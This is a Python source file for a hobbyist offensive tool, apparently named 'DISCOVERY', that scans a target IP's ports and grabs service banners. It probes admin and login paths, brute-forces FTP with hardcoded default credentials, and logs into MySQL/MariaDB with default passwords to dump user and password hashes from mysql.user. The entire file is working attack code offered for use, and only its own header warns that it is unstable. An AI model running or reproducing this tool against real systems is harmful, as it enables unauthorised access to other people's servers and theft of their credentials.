# THIS SCRIPT IS CURRENTLY UNDER DEVELOPPEMENT. THIS VERSION IS A BASIC AND UNSTABLE VERSION OF THE FUTURE TOOL. I DONT RECOMMAND USING IT #
import socket
import requests
from ftplib import FTP
import threading
import pymysql
from urllib.parse import urlparse
import time
import shutil
from colorama import Fore
from itertools import cycle

ports = [21, 22, 23, 80, 443, 3306]
vulnerable_http_paths = ["/admin", "/login", "/dashboard"]
vulnerable_ports = {21: 'ftp', 80: 'http', 443: 'https', 3306: 'mysql'}
ftp_usernames = ['admin', 'root', 'user', 'ftp']
ftp_passwords = ['admin', 'password', '123456', 'toor']
mysql_usernames = ['root', 'admin']
mysql_passwords = ['root', 'password', '123456']

scan_results = {}

def clear_console():
    print("\033[H\033[J", end="")

def display_ascii_art_with_animation():
    art = r"""
 /$$$$$$$  /$$$$$$  /$$$$$$   /$$$$$$   /$$$$$$  /$$    /$$ /$$$$$$$$ /$$$$$$$  /$$     /$$
| $$__  $$|_  $$_/ /$$__  $$ /$$__  $$ /$$__  $$| $$   | $$| $$_____/| $$__  $$|  $$   /$$/
| $$  \ $$  | $$  | $$  \__/| $$  \__/| $$  \ $$| $$   | $$| $$      | $$  \ $$ \  $$ /$$/ 
| $$  | $$  | $$  |  $$$$$$ | $$      | $$  | $$|  $$ / $$/| $$$$$   | $$$$$$$/  \  $$$$/  
| $$  | $$  | $$   \____  $$| $$      | $$  | $$ \  $$ $$/ | $$__/   | $$__  $$   \  $$/   
| $$  | $$  | $$   /$$  \ $$| $$    $$| $$  | $$  \  $$$/  | $$      | $$  \ $$    | $$    
| $$$$$$$/ /$$$$$$|  $$$$$$/|  $$$$$$/|  $$$$$$/   \  $/   | $$$$$$$$| $$  | $$    | $$    
|_______/ |______/ \______/  \______/  \______/     \_/    |________/|__/  |__/    |__/    """
    console_width = shutil.get_terminal_size().columns
    colors = cycle([Fore.RED, Fore.LIGHTRED_EX])

    for _ in range(10):
        clear_console()
        color = next(colors)
        for line in art.splitlines():
            print(color + line.center(console_width))
        time.sleep(0.2)

    print(Fore.RED + "Made by Kyra".center(console_width))
    time.sleep(3)
    print(Fore.RED + "WARNING! THIS SCRIPT IS CURRENTLY UNDER DEVELOPPEMENT. THIS VERSION IS A BASIC AND UNSTABLE VERSION OF THE FUTURE TOOL. I DONT RECOMMAND USING IT ".center(console_width))
    time.sleep(5)

def interactive_menu():
    while True:
        clear_console()
        print(Fore.RED + "Main Menu".center(shutil.get_terminal_size().columns, "-"))
        print(Fore.LIGHTRED_EX + "[1] Start Scan")
        print(Fore.LIGHTRED_EX + "[2] Exit")
        choice = input(Fore.RED + "Choose an option: ")
        if choice == "1":
            return
        elif choice == "2":
            clear_console()
            print(Fore.RED + "Thanks for using my tool!".center(shutil.get_terminal_size().columns))
            time.sleep(2)
            exit()
        else:
            print(Fore.LIGHTRED_EX + "Invalid option!".center(shutil.get_terminal_size().columns))
            time.sleep(2)

def save_results():
    with open("scan_report.txt", "w") as file:
        file.write("=== TARGET SCAN ===\n")
        file.write(f"IP Address: {scan_results.get('target_ip', 'Not specified')}\n\n")
        
        file.write("=== OPEN PORTS ===\n")
        for port, status in scan_results.get('ports', {}).items():
            file.write(f"Port {port}: {status}\n")
        
        file.write("\n=== HTTP VULNERABILITIES ===\n")
        for path, status in scan_results.get('http_vulnerabilities', {}).items():
            file.write(f"Path {path}: {status}\n")
        
        file.write("\n=== FTP VULNERABILITIES ===\n")
        for result in scan_results.get('ftp', []):
            file.write(result + "\n")
        
        file.write("\n=== MYSQL VULNERABILITIES ===\n")
        for result in scan_results.get('mysql', []):
            file.write(result + "\n")

        file.write("\n=== RAW INFORMATION ===\n")
        for key, value in scan_results.items():
            if isinstance(value, dict) or isinstance(value, list):
                file.write(f"{key}:\n")
                file.write(str(value) + "\n")
            else:
                file.write(f"{key}: {value}\n")

def banner_grabbing(host, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socket.setdefaulttimeout(2)
    try:
        sock.connect((host, port))
        sock.send(b'HEAD / HTTP/1.0\r\n\r\n')
        banner = sock.recv(1024).decode('utf-8', errors='ignore')
        scan_results['banner'] = f"Banner found on {host}:{port} -> {banner.strip()}"
        print(scan_results['banner'])
    except:
        pass
    finally:
        sock.close()

def scan_port(host, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socket.setdefaulttimeout(1)
    try:
        result = sock.connect_ex((host, port))
        if result == 0:
            scan_results['ports'] = scan_results.get('ports', {})
            scan_results['ports'][port] = f"Port {port} is open on {host}"
            print(scan_results['ports'][port])
            banner_grabbing(host, port)
            if port == 21:
                brute_force_ftp(host)
            if port == 3306:
                exploit_mariadb_vuln(host)
    except:
        pass
    finally:
        sock.close()

def scan_http_vulnerabilities(url):
    scan_results['http_vulnerabilities'] = scan_results.get('http_vulnerabilities', {})
    for path in vulnerable_http_paths:
        target_url = f"{url}{path}"
        try:
            response = requests.get(target_url, timeout=2)
            if response.status_code == 200:
                scan_results['http_vulnerabilities'][target_url] = f"Vulnerable page found: {target_url} -> Code {response.status_code}"
                print(f"Vulnerable page found: {target_url} -> Code {response.status_code}")
        except:
            pass

def brute_force_ftp(host):
    scan_results['ftp'] = scan_results.get('ftp', [])
    print(f"Attempting FTP brute force on {host}...")
    for username in ftp_usernames:
        for password in ftp_passwords:
            try:
                ftp = FTP(host)
                ftp.login(username, password)
                result = f"FTP login successful on {host} with {username}:{password}"
                scan_results['ftp'].append(result)
                print(result)
                ftp.quit()
                return
            except:
                pass
    scan_results['ftp'].append(f"FTP brute force failed on {host}")
    print(f"FTP brute force failed on {host}")

def exploit_mariadb_vuln(host):
    scan_results['mysql'] = scan_results.get('mysql', [])
    print(f"Exploiting MariaDB vulnerability on {host}...")
    for username in mysql_usernames:
        for password in mysql_passwords:
            try:
                conn = pymysql.connect(host=host, user=username, password=password, port=3306)
                cursor = conn.cursor()
                cursor.execute("SELECT user, host, password FROM mysql.user")
                rows = cursor.fetchall()
                for row in rows:
                    result = f"MariaDB user found on {host}: {row}"
                    scan_results['mysql'].append(result)
                    print(result)
                conn.close()
                return
            except pymysql.MySQLError as e:
                print(f"Failed MariaDB connection on {host} with {username}:{password} ({e})")
    scan_results['mysql'].append(f"MariaDB exploitation failed on {host}")
    print(f"MariaDB exploitation failed on {host}")

def scan_target(host):
    scan_results['target_ip'] = host.strip()
    if '.' in host:
        print(f"Scanning {host} started...\n")
        for port in ports:
            thread = threading.Thread(target=scan_port, args=(host, port))
            thread.start()

        scan_http_vulnerabilities(f"http://{host}")
        scan_http_vulnerabilities(f"https://{host}")

def prompt_user_for_actions():
    print("\nActions Available:")
    print("1. Perform FTP brute force attack")
    print("2. Exploit MariaDB vulnerability")
    print("3. Scan for HTTP vulnerabilities")
    print("4. Scan for open ports")
    action = input("Enter the action number to perform or press Enter to skip: ")
    return action

def main():
    display_ascii_art_with_animation()
    interactive_menu()
    target_ip = input("Enter the target IP address: ")
    scan_target(target_ip)
    action = prompt_user_for_actions()
    if action == '1':
        brute_force_ftp(target_ip)
    elif action == '2':
        exploit_mariadb_vuln(target_ip)
    elif action == '3':
        scan_http_vulnerabilities(f"http://{target_ip}")
        scan_http_vulnerabilities(f"https://{target_ip}")
    elif action == '4':
        for port in ports:
            scan_port(target_ip, port)
    save_results()

if __name__ == "__main__":
    main() 
